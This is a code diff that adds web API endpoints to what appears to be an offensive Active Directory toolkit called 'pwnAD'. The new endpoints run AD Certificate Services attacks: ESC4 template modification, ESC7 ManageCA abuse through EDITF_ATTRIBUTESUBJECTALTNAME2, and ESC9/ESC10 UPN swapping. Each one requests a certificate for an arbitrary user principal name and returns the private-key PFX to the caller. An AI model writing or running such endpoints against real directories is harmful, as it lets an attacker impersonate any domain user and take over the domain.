@@ -106,11 +106,14 @@ def template_detail(name):
 
             # Get CAs and map
             cas = get_enrollment_services(conn)
+            ca_names = []
             for ca in cas:
                 if template.name in ca.certificate_templates:
                     template.enabled_on_cas.append(ca.name)
+                    ca_names.append(ca.name)
 
             ctx['template'] = template
+            ctx['template_cas'] = ca_names
         else:
             ctx['error'] = f"Template '{name}' not found"
 
@@ -251,4 +254,117 @@ def api_adcs_request():
             )
     except Exception as e:
         logging.error(f"ADCS request error: {e}")
+        return jsonify(success=False, message=str(e)), 500
+
+
+@adcs_bp.route('/api/adcs/exploit/esc4', methods=['POST'])
+def api_exploit_esc4():
+    """ESC4: modify writable template, request cert, restore."""
+    import os, base64, tempfile
+    conn = get_conn()
+    ca_name = request.form.get('ca_name', '').strip()
+    template = request.form.get('template', '').strip()
+    upn = request.form.get('upn', '').strip()
+
+    if not ca_name or not template or not upn:
+        return jsonify(success=False, message='CA name, template, and UPN are required'), 400
+
+    try:
+        from pwnAD.lib.certreq import exploit_esc4
+        with tempfile.TemporaryDirectory() as tmpdir:
+            output = os.path.join(tmpdir, 'cert.pfx')
+            pfx_path, cert, key = exploit_esc4(
+                conn, ca_name=ca_name, template_name=template,
+                target_upn=upn, output=output,
+            )
+            with open(pfx_path, 'rb') as f:
+                pfx_b64 = base64.b64encode(f.read()).decode()
+            return jsonify(
+                success=True,
+                message=f'ESC4 exploit successful — certificate for {upn}',
+                pfx_b64=pfx_b64,
+                cert_info={
+                    'subject': cert.subject.rfc4514_string(),
+                    'issuer': cert.issuer.rfc4514_string(),
+                    'serial': format(cert.serial_number, 'x'),
+                },
+            )
+    except Exception as e:
+        logging.error(f"ESC4 exploit error: {e}")
+        return jsonify(success=False, message=str(e)), 500
+
+
+@adcs_bp.route('/api/adcs/exploit/esc7', methods=['POST'])
+def api_exploit_esc7():
+    """ESC7: enable EDITF_ATTRIBUTESUBJECTALTNAME2 via ManageCA, request cert."""
+    import os, base64, tempfile
+    conn = get_conn()
+    ca_name = request.form.get('ca_name', '').strip()
+    template = request.form.get('template', '').strip() or None
+    upn = request.form.get('upn', '').strip()
+
+    if not ca_name or not upn:
+        return jsonify(success=False, message='CA name and UPN are required'), 400
+
+    try:
+        from pwnAD.lib.certreq import exploit_esc7_manage_ca
+        with tempfile.TemporaryDirectory() as tmpdir:
+            output = os.path.join(tmpdir, 'cert.pfx')
+            pfx_path, cert, key = exploit_esc7_manage_ca(
+                conn, ca_name=ca_name, template_name=template,
+                target_upn=upn, output=output,
+            )
+            with open(pfx_path, 'rb') as f:
+                pfx_b64 = base64.b64encode(f.read()).decode()
+            return jsonify(
+                success=True,
+                message=f'ESC7 exploit successful — certificate for {upn}',
+                pfx_b64=pfx_b64,
+                cert_info={
+                    'subject': cert.subject.rfc4514_string(),
+                    'issuer': cert.issuer.rfc4514_string(),
+                    'serial': format(cert.serial_number, 'x'),
+                },
+            )
+    except Exception as e:
+        logging.error(f"ESC7 exploit error: {e}")
+        return jsonify(success=False, message=str(e)), 500
+
+
+@adcs_bp.route('/api/adcs/exploit/esc9', methods=['POST'])
+def api_exploit_esc9():
+    """ESC9/ESC10: swap UPN on target, request cert, restore."""
+    import os, base64, tempfile
+    conn = get_conn()
+    target_sam = request.form.get('target_sam', '').strip()
+    ca_name = request.form.get('ca_name', '').strip()
+    template = request.form.get('template', '').strip()
+    upn = request.form.get('upn', '').strip()
+
+    if not target_sam or not ca_name or not template or not upn:
+        return jsonify(success=False, message='Target account, CA name, template, and UPN are required'), 400
+
+    try:
+        from pwnAD.lib.certreq import exploit_esc9
+        with tempfile.TemporaryDirectory() as tmpdir:
+            output = os.path.join(tmpdir, 'cert.pfx')
+            pfx_path, cert, key = exploit_esc9(
+                conn, target_sam=target_sam, ca_name=ca_name,
+                template_name=template, impersonate_upn=upn,
+                output=output,
+            )
+            with open(pfx_path, 'rb') as f:
+                pfx_b64 = base64.b64encode(f.read()).decode()
+            return jsonify(
+                success=True,
+                message=f'ESC9 exploit successful — certificate for {upn}',
+                pfx_b64=pfx_b64,
+                cert_info={
+                    'subject': cert.subject.rfc4514_string(),
+                    'issuer': cert.issuer.rfc4514_string(),
+                    'serial': format(cert.serial_number, 'x'),
+                },
+            )
+    except Exception as e:
+        logging.error(f"ESC9 exploit error: {e}")
         return jsonify(success=False, message=str(e)), 500
